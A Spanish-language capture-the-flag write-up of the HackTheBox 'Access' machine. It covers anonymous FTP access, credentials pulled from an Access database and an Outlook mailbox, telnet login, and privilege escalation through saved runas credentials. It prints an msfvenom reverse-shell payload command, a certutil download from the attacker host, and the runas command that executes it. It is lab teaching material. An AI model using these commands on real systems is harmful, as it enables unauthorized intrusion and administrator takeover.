---
layout      : post
title       : "HackTheBox - Access"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png
category    : [ htb ]
tags        : [ FTP, telnet, runas.exe, .mdb ]
---
Máquina **Windows** nivel fácil, vamos a movernos con **FTP**, jugaremos con info de tablas de una base de datos **Microsoft Access**, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una instrucción que involucra al usuario **Administrator** con el binario **runas.exe**, esto para que ejecutemos lo que queramos como el propio admin.

![156accessHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156accessHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [egre55](https://www.hackthebox.eu/profile/1190).

Inicialmente jugaremos con el servicio **FTP** para encontrar dos recursos: `Backups` y `Engineer`. En `Backups` tendremos un archivo `.mdb` (Microsoft Access DB), que usaremos para encontrar credenciales, posteriormente las usaremos para descomprimir un objeto encontrado en la carpeta `Engineer`, ese objeto tendrá un archivo `.pst`, de él obtendremos un mail con unas credenciales de un usuario llamado **security**, usaremos el servicio **telnet** para obtener una **CMD** como ese usuario en el sistema.

Finalmente nos aprovecharemos de una instrucción que relaciona el binario `runas.exe` (ejecuta tareas como otros usuarios) con el usuario **Administrator** para llamar el binario `Access.exe`, jugueteando simplemente debemos modificar la ruta al binario que queremos que ejecute `runas.exe`. 

Así, generaremos un **payload** con ayuda de `msfvenom` para conseguir una **Reverse Shell** una vez sea ejecutado con `runas.exe` como el usuario **Administrator**.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Va queriendo ser R34L (pero le cuesta) con algo de jugueteo manual ;)

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Khe ze cuenta la jente¿ Pa none bamoz?

1. [Enumeración](#enumeracion).
  * [Escaneos Nmap](#enum-nmap).
  * [Enumeración puerto 21 (FTP)](#puerto-21).
2. [Explotación](#explotacion).
  * [Acceso al sistema como el usuario **security**](#puerto-23).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

...

### Enumeración de puertos con nmap [⌖](#enum-nmap) {#enum-nmap}

Vamos a empezar con un escaneo de puertos apoyándonos de **nmap**, así vamos descubriendo por donde tirar:

```bash
❱ nmap -p- --open -v 10.10.10.98 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Nos responde:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.98
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.98 ()  Status: Up
Host: 10.10.10.98 ()  Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http///  Ignored State: filtered (65532)
# Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 197.46 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 21     | **[FTP](https://tecnonautas.net/que-es-el-puerto-tcp-21/)** |
| 23     | **[Telnet](https://www.profesionalreview.com/2019/01/20/telnet-que-es/)** |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)** |

**~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.98
    [*] Open ports: 21,23,80

[*] Ports copied to clipboard
```

**)~**

Ahora teniendo los puertos activos de la máquina, hagamos un escaneo de versiones y scripts conocidos para cada puerto, así podremos identificar cositas relevantes en cada uno:

```bash
❱ nmap -p 21,23,80 -sC -sV 10.10.10.98 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

El escaneo nos responde:

```bash
# Nmap 7.80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p 21,23,80 -sC -sV -oN portScan 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 184.58 seconds
```

Podemos destacar:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 21     | FTP      | Microsoft ftpd |
| 80     | HTTP     | Microsoft IIS httpd 7.5 |

- Además que tenemos acceso al servicio FTP con las credenciales **anonymous**.

Pues nada, a explorar y romper esta machina :P

...

### Puerto 21 - FTP [⌖](#puerto-21) {#puerto-21}

En el escaneo de **nmap** nos percatamos que tenemos habilitado el [acceso anónimo](https://www.viainternet.com.mx/clientes/index.php/knowledgebase/10/iComo-utilizo-el-FTP-Anonimo.html) al servidor **FTP**, pues entremos, colocamos como usuario y contraseña `anonymous`:

```bash
❱ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

Listo, tamos dentro, recorramos a ver si hay algo interesante:

```bash
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.  
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> 
```

Dos directorios, veamos `Backups` primero:

```bash
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.  
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> 
```

Encontramos un objeto `.mdb`, que [investigando](https://www.reviversoft.com/es/file-extensions/mdb) se trata de un archivo de bases de datos **Microsoft Access**:

> Estos archivos están clasificados como archivos de bases de datos, ya que en su mayoría contienen la estructura de bases de datos, las entradas y las formas, las consultas, los informes, la configuración de la seguridad de base de datos...

Pues descarguémoslo a nuestro sistema y sigamos enumerando la otra carpeta:

```bash
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
150 Opening BINARY mode data connection.
226 Transfer complete.
5652480 bytes received in 13.14 secs (419.9918 kB/s)  
ftp> 
```

```bash
❱ file backup.mdb 
backup.mdb: Microsoft Access Database
```

Bien, veamos `Engineer`:

```bash
ftp> cd Engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> 
```

Un archivo comprimido, descarguémoslo:

```bash
ftp> get "Access Control.zip"
```

```bash
❱ file Access\ Control.zip 
Access Control.zip: Zip archive data, at least v2.0 to extract
```

...

Pues juguemos con el archivo de bases de datos...

Apoyándonos en una consulta web, [encontramos un foro](https://superuser.com/questions/34326/opening-mdb-files-in-ubuntu) con algunos recursos para ver la data del archivo:

* [DBeaver](https://superuser.com/questions/34326/opening-mdb-files-in-ubuntu#answer-1632462).
* [www.mdbopener.com](www.mdbopener.com).

Cualquiera de las dos nos viene bien, además que podemos complementarlas:

**Usando la web**:

Cargamos el archivo, esperamos un rato y obtenemos:

![156google_mdbopenerCom](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbopenerCom.png)

Nótese a toda la derecha que hay muchas tablas :P Pero lo lindo de esta interfaz es que nos indica cuál de ellas tiene información dentro (**# Rows**), así no tenemos que ir mirando una a una.

Veamos rápidamente la otra alternativa:

**Usando DBeaver**:

Despues de instalar el programa (siguiendo el foro, no es necesario ejecutar `apt install -f`) lo ejecutamos en segundo plano, así lo desligamos de la consola y evitamos que la use:

```bash
❱ (dbeaver >& /dev/null &)
```

Está linda la herramienta porque podemos jugar con muchísimas bases de datos:

![156bash_dbeaver_selection](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_selection.png)

Encontramos la relacionada con **Microsoft Access**, la seleccionamos y nos pedirá un `path`, ahí le pasamos la ruta donde está el archivo `.mdb` y damos clic en **Finalizar**, deberíamos terminar en esta ventana:

![156bash_dbeaver_laststep](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_laststep.png)

Ahora damos clic donde señale, pueda que les pida algo de descargar, si si, pues le dan a descargar 🥳 y si no pues supongo que todo ira bien u.u 😱

Finalmente deberíamos tener esto:

![156bash_dbeaver_backupMDB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_backupMDB.png)

Y listo, veríamos todas las tablas, pero pues deberíamos ir una a una viendo cuál tiene data, lo cual está aburrido :P Peeeero en esta interfaz podemos agregar consultas **SQL**, por eso digo que se complementan, en una vamos directamente a donde hay información y en la otra filtramos esa información en caso de ser necesario. Así que las dos herramientas están guapetonas.

Explorando las tablas encontramos algunas llamativas...

**USERINFO**:

![156google_mdbonline_USERINFOtable](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbonline_USERINFOtable.png)

Que en su contenido tiene varios campos, pero filtrando por los destacables tenemos:

![156bash_dbeaver_USERINFOtable_query](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_dbeaver_USERINFOtable_query.png)

Unos "usuarios" (son nombres, pero podemos pensar en ellos como usuarios también) con contraseñas...

**auth user**:

![156google_mdbonline_AUTHUSERtable](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_mdbonline_AUTHUSERtable.png)

Encontramos otras credenciales, pero esta vez más directas e.e Tenemos usuarios y contraseñas, aunque una destaca (al ser distinta de las otras) ¿cuál será? e.e 😬

...

## Explotación [#](#explotacion) {#explotacion}

Tenemos unas credenciales, guardémoslas y terminemos de enumerar lo obtenido del servidor **FTP**, veamos el comprimido:

```bash
❱ unzip Access\ Control.zip 
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

Jmmm, nos muestra que tiene contenido (un archivo `.pst`) pero no nos deja obtenerlo, validemos con la herramienta **7z** ((de)compresor universal) si es necesaria una contraseña para descomprimir el objeto:

```bash
❱ 7z x Access\ Control.zip 
...
Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst  
...
Sub items Errors: 1
```

Y si, ese es el error, nos pide contraseña. Pues aprovechando que tenemos credenciales probémoslas contra el comprimido...

Probando la que habíamos dicho que era distinta a las demás (`access4u@security`) conseguimos descomprimir el objeto sin problemas:

```bash
❱ 7z x Access\ Control.zip 
...
Enter password (will not be echoed):  
Everything is Ok         

Size:       271360
Compressed: 10870
```

Bien, obtenemos el archivo `.pst`:

```bash
❱ file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Un objeto [.pst](https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790) objeto que contiene mensajes y otros items relacionados con **Outlook**, pero para poder leer ese objeto es necesario convertirlo a formato "readable", usaremos [readpst](https://linux.die.net/man/1/readpst) para ese propósito:

```bash
❱ readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

El archivo contiene el directorio **Deleted Items** y ha recuperado **2** items de él, esa información la guarda en un archivo `.mbox` con formato entendible:

```bash
❱ ls
'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'   backup.mdb
```

Viendo su contenido encontramos:

```bash
❱ cat Access\ Control.mbox
```

![156bash_mboxfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_mboxfile.png)

Opa, varias cositas destacadas:

* `john@megacorp.com`, un usuario (`john`, que lo habíamos visto antes) y un dominio (que no creo que sea relevante, ya que es `.com`).
* `security@accesscontrolsystems.com`, otro usuario y otro dominio extraño.
* Nos confirman una cuenta llamada **security** y una contraseña asignada a ella:
  * `4Cc3ssC0ntr0ller`.

Bien, pues varias credenciales para probar 🏜️

...

### Puerto 23 - Telnet [⌖](#puerto-23) {#puerto-23}

El servicio [telnet](https://www.profesionalreview.com/2019/01/20/telnet-que-es/) nos ayuda a establecer conexiones remotas con otros ordenadores, así de sencillo, algo así como **SSH**, pero telnet es inseguro :P

Usando la herramienta `telnet` podemos empezar a jugar:

```bash
❱ telnet 10.10.10.98
...
Welcome to Microsoft Telnet Service 

login: admin
password: 
The handle is invalid.

Login Failed
```

Efectivamente nos pide unas credenciales, pues probando las que conseguimos del correo obtenemos:

![156bash_telnet_securitySH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_telnet_securitySH.png)

Peeeeeeeeeerrrrrrrrrrrrfecto, estamos dentro del sistema como el usuario **security** :o

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156google_gif_grandpaDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema encontramos una carpeta llamada `ZKTeco`, que usualmente no la vemos en un sistema **Windows**, así que es llamativa:

```powershell
c:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of c:\

08/23/2018  11:05 PM    <DIR>          inetpub
07/14/2009  04:20 AM    <DIR>          PerfLogs
08/23/2018  09:53 PM    <DIR>          Program Files
08/24/2018  08:40 PM    <DIR>          Program Files (x86)
08/24/2018  08:39 PM    <DIR>          temp
08/21/2018  11:31 PM    <DIR>          Users
08/23/2018  11:40 PM    <DIR>          Windows
08/22/2018  08:23 AM    <DIR>          ZKTeco
               0 File(s)              0 bytes
               8 Dir(s)  16,771,743,744 bytes free

c:\>
```

```powershell
c:\>dir ZKTeco
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of c:\ZKTeco

08/22/2018  08:23 AM    <DIR>          .
08/22/2018  08:23 AM    <DIR>          ..
06/11/2021  04:40 PM    <DIR>          ZKAccess3.5
               0 File(s)              0 bytes
               3 Dir(s)  16,771,743,744 bytes free

c:\>
```

Al parecer contiene un software llamado **[ZKAccess3.5](https://www.zktecolatinoamerica.com/software/zkaccess-3-5/)**, que sirve para administrar el control de acceso al sistema...

Dentro del directorio hay varios archivos, pero ninguno interesante ): Buscando vulnerabilidades relacionadas, encontramos [esta](https://www.exploit-db.com/exploits/40323), pero no es funcional ☹️

Despues de enumerar más a fondo, encontramos un archivo relacionado con el servicio **ZKAccess** en el directorio `C:\Users\Public\Desktop`:

**(Debemos listar todo, hasta archivos ocultos)**

Normal:

```powershell
c:\Users\Public>dir 
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of c:\Users\Public

07/14/2009  05:57 AM    <DIR>          .
07/14/2009  05:57 AM    <DIR>          ..
07/14/2009  06:06 AM    <DIR>          Documents
07/14/2009  05:57 AM    <DIR>          Downloads
07/14/2009  05:57 AM    <DIR>          Music
07/14/2009  05:57 AM    <DIR>          Pictures
07/14/2009  05:57 AM    <DIR>          Videos
               0 File(s)              0 bytes
               7 Dir(s)  16,771,743,744 bytes free

c:\Users\Public>
```

Normal más ocultos:

```powershell
c:\Users\Public>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of c:\Users\Public

07/14/2009  05:57 AM    <DIR>          .
07/14/2009  05:57 AM    <DIR>          ..
08/28/2018  07:51 AM    <DIR>          Desktop
07/14/2009  05:57 AM               174 desktop.ini
07/14/2009  06:06 AM    <DIR>          Documents
07/14/2009  05:57 AM    <DIR>          Downloads
07/14/2009  03:34 AM    <DIR>          Favorites
07/14/2009  05:57 AM    <DIR>          Libraries
07/14/2009  05:57 AM    <DIR>          Music
07/14/2009  05:57 AM    <DIR>          Pictures
07/14/2009  05:57 AM    <DIR>          Videos
               1 File(s)            174 bytes
              10 Dir(s)  16,771,743,744 bytes free

c:\Users\Public>
```

Y en el directorio `Desktop` tenemos:

```powershell
c:\Users\Public>cd Desktop

c:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of c:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,771,743,744 bytes free

c:\Users\Public\Desktop>
```

Veamos su contenido:

![156win_typelnkFILE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156win_typelnkFILE.png)

Encontramos una instrucción, que se ejecuta cada vez que se llame al archivo [.lnk](https://fileinfo.com/extension/lnk). Rompámosla y entendamos que está haciendo rápidamente:

* `..\..\..\Windows\System32\runas.exe`: Llama al programa [runas.exe], el cual sirve como método de ejecutar comandos o tareas como otros usuarios.
* `C:\ZKTeco\ZKAccess3.5`: En la lógica de la instrucción esto no haría nada y se habría mezclado en el output del `.lnk` (o sea, esto no hace nada, lo obviaremos).
* `/user:ACCESS\Administrator`: El usuario con el que se ejecutara el proceso.
* `/savecred`: Es usado para que no solicite la contraseña todas las veces que se ejecute el `.lnk`, la pedirá la primera vez, pero ya despues no.
* `"C:\ZKTeco\ZKAccess3.5\Access.exe"`: Es el proceso que ejecuta el binario `runas.exe` como usuario **Administrator** al "ejecutar" el archivo `.lnk`.

Así que lo que se estaría ejecutando seria:

```txt
runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

Validando si esa línea está haciendo algo, no encontré algún cambio, pero podemos probar el funcionamiento de `/savecred`:

**Nos pide contraseña:**

```powershell
c:\Users\Public\Desktop>runas.exe /user:ACCESS\Administrator "C:\ZKTeco\ZKAccess3.5\Access.exe"  
Enter the password for ACCESS\Administrator: nosabo:(

c:\Users\Public\Desktop>
```

**No nos pide contraseña:**

```powershell
c:\Users\Public\Desktop>runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"  

c:\Users\Public\Desktop>
```

Así que probablemente está ejecutando algo con el binario `Access.exe` y no nos da problemas...

...

> **runas**: Nos permite lanzar programas (tanto propios como del sistema operativo) y archivos por lotes en nombre de otro usuario. Es decir, como usuario "x" lanzaremos un comando como usuario "y" sin necesidad de iniciar sesión en el equipo con "y". [Ejemplo de uso comando **runas.exe** en Windows](https://protegermipc.net/2018/09/05/ejemplos-uso-del-comando-runas-en-windows/).

* Otro recurso: [**RunAs.exe** en **Windows**](http://freyes.svetlian.com/RunAs/RunAs.htm).

Pues perfecto, usemos esa propia línea, pero en vez de ejecutar el binario `Access.exe` intentemos ejecutar un payload que contenga una **Reverse Shell**, así obtendríamos una Shell como el usuario **Administrator** (ya que todo lo que ejecutemos se ejecutaría como él), generémoslo con ayuda de [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4434 -f exe -o averque.exe
```

Entonces, cuando haga la petición hacia el **LHOST** por el **LPORT** generara una **shell_reverse_tcp** (una terminal normalita de toda la vida). Lo guardamos con formato `.exe` y que se llame `averque.exe`.

Pongámonos en escucha tanto en el puerto **4434** como en un servidor web para poder subir el archivo:

```bash
❱ nc -lvp 4434
listening on [any] 4434 ...
```

```bash
❱ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora sí, juguemos con **certutil.exe**:

```powershell
C:\Users\security\Videos>certutil.exe -f -urlcache -split http://10.10.14.16:8000/averque.exe c:\Users\security\Videos\averque.exe
```

```powershell
C:\Users\security\Videos>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Videos

06/11/2021  25:25 PM    <DIR>          .
06/11/2021  25:25 PM    <DIR>          ..
06/11/2021  25:25 PM            73,802 averque.exe
               2 File(s)        147,604 bytes
               2 Dir(s)  16,771,743,744 bytes free

C:\Users\security\Videos>
```

Y ahora ejecutamos el binario con la ayuda de **runas** y las credenciales que tenemos (guardadas):

```powershell
C:\Users\security\Videos>runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\Videos\averque.exe"  
```

Y en nuestro listeneeeeeeeeeeer:

![156bash_administrator_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156bash_administrator_RevSH.png)

Y siiiiiiiii, tamos dentro del sistema como el usuario **Administrator** ⛱️

Solo nos quedaría ver las **flags**:

![156flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156flags.png)

...

Bonito camino, movimientos con **FTP** bastante divertidos, vista amplia y pensamiento lateral.

Muchas gracias por leer yyyyyyyyyyyyyyyyyyy A R O M P E R T O D O !